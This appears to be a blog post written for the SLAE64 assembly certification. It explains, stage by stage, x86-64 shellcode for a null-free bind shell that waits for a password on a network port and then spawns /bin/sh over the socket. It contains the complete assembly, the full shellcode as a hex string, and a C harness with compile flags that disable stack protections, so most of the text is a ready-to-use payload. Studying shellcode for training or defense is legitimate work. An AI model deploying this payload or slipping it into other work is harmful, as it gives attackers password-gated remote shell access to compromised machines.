# Bindshell with Password

This assignment was split in two parts:
1. Make the BindShell-Shellcode from the class free of nullbytes
2. Create a BindShell-Shellcode which spawns a shell after a certain password has been entered

I first created a nullbyte-free version of the shellcode from the class and then extended it with an authentication mechanism. The shellcode consists of 8 stages:

## Create a socket

This part of the shellcode basically does:
```
socket(AF_INET, SOCK_STREAM, 0)
```

And is achieved by:
```
    xor rax, rax
    cdq ; clear rdx
    push SYS_SOCKET
    pop rax ; RAX contains the socket() syscall
    push AF_INET
    pop rdi ; rdi contains the AF_INET parameter
    push SOCK_STREAM
    pop rsi ; rsi contains the SOCK_STREAM parameter

    SYSCALL
```

The comments should be self-explaining. Note that I made use of the ```push pop``` technique to fill the registers with the right values. The push pop technique avoids null bytes and is shorter then the ```mov``` instruction.
Also I used cdq to clear out the RDX register which is possible as RAX is 0 at this point.

## Bind the socket
Again the following piece of shellcode is equivalent to this C snippet:
```
bind(sockfd, const struct sockaddr *addr, 16)
```

Assembly:
```
    ; First set up the struct sockaddr_in on the stack
    push rdx        ; sin_zero
    add dx, PORT    ; Place the port in the struct
    shl rdx, 16     ; Shift the port to the right position
    add dx, AF_INET ; add the af_inet flag to the struct
    push rdx        ; Put the struct on the stack
    push rsp
    pop rsi         ; Rsi now points to the struct

    push rax        ; Rax still contains the created socket
    pop rdi         ; The socket is now in Rdi
    push SIZE_STRUCT
    pop rdx         ; Rdx does now contain the size of the struct

    push SYS_BIND
    pop rax         ; Rax equals the syscallnumber for bind

    SYSCALL
```

In order to create the struct I made use of shifting and used the lower bit registers to arrange the struct.

## Listen
C pseudocode:
```
; listen(fd, 1)
```
```
    push rax ; Rax should contain null as bind() is expected to work successfully
    pop RSI
    inc RSI  ; Rsi is now 1
    push SYS_LISTEN
    pop RAX  ; Rax has the syscallnumber for listen

    SYSCALL
```
Nothing surprising here, note that I rely on bind() returning 0 :-)

## Accept:
C pseudocode:
```
    ; accept(sockfd, struct sockaddr *addr, socklen_t *addrlen)
```
Assembly:
```
    push rsp ; Reuse old struct
    pop rsi  ; Rsi points to struct
    push SIZE_STRUCT
    push RSP
    pop RDX ; Pointer to the size of the struct in RDX
    push SYS_ACCEPT
    pop RAX

    SYSCALL
```

In this step I reused the old struct on the stack for the accept call. To do so I rely on the fact that the Rsp has the same value as it had during the bind syscall.

## Authentication
I first read 4 bytes from the new socket an then compare it to a defined constant.

To read the password I did this in C pseudocode:
```
    ; read(fd, *buf, 4)
```

Assembly:
```
    add RSI, 8 ; Make it point to sin_zero of sockaddr. We dont need this anymore
    push RAX ; Rax still contains the accepted socket
    pop RDI ; Rdi contains the new socket
    xor al, al ; Clear out rax
    push 0x4 ; Specify num_bytes to read
    pop RDX

    SYSCALL ; Do the read
```

Note that I store the read password in the sin_zero field of the sockaddr_in struct. I mean ... there are nullbytes already which mark the end of the password. :-)

To compare the entered password with the constant I did:
```
    cmp dword[rsi], PASSWORD ; Rsi still points to the sin_zero field which contains the entered pw.
    jne _burn ; Cause a sigsegv upon a wrong password
```

## DUP 2
The next step is to redirect stdin, stdout and stderr to the new socket. Otherwise we would not see any output from the shell as it prints out to stdout, not to the socket.

For this I created a loop which decrements a counter starting from 2-0. It starts from 2 as 2 marks stderr and 0 stdin.

Assembly:
```
_dup2:
   ; dup2(client, STDIN)
   ; dup2(client, STDOUT)
   ; dup2(client, STERR)

    push 3
    pop rsi

_loop:

    dec esi
    push SYS_DUP2
    pop rax
    SYSCALL

    jne _loop
```

## Finally call execve
This is a pretty standard way to call execve('/bin/sh', NULL, NULL)
```

    cdq ; Null out rdx. Rax should still be zero because the last dup2() redirected stdin.
    push rax
    mov rax, BINSH ; BINSH hexstring in rax
    push rax
    push rsp ; get a pointer to binsh
    pop rdi

    xor rax, rax
    mov al, SYS_EXECVE
    syscall
```

In order to test this shellcode I made use of the following C snippet:
```

#include <string.h>

char shellcode[] = "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\x66\x81\xc2\x11\x5c\x48\xc1\xe2\x10\x66\x83\xc2\x02\x52\x54\x5e\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x50\x5e\x48\xff\xc6\x6a\x32\x58\x0f\x05\x54\x5e\x6a\x10\x54\x5a\x6a\x2b\x58\x0f\x05\x48\x83\xc6\x08\x50\x5f\x30\xc0\x6a\x04\x5a\x0f\x05\x81\x3e\x41\x41\x41\x41\x75\x22\x6a\x03\x5e\xff\xce\x6a\x21\x58\x0f\x05\x75\xf7\x99\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x54\x5f\x48\x31\xc0\xb0\x3b\x0f\x05";

main(void)
{
        printf("Shellcode length: %d\n", (int)strlen(shellcode));

        /* pollute registers and call shellcode */
        __asm__ (        "mov $0xffffffffffffffff, %rax\n\t"
                         "mov %rax, %rbx\n\t"
                         "mov %rax, %rcx\n\t"
                         "mov %rax, %rdx\n\t"
                         "mov %rax, %rsi\n\t"
                         "mov %rax, %rdi\n\t"
                         "mov %rax, %rbp\n\t"

                         "call shellcode"       );
}

```

Compile:
```
gcc -m64 -z execstack -fno-stack-protector Test.c -o Test -no-pie
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE64-1581
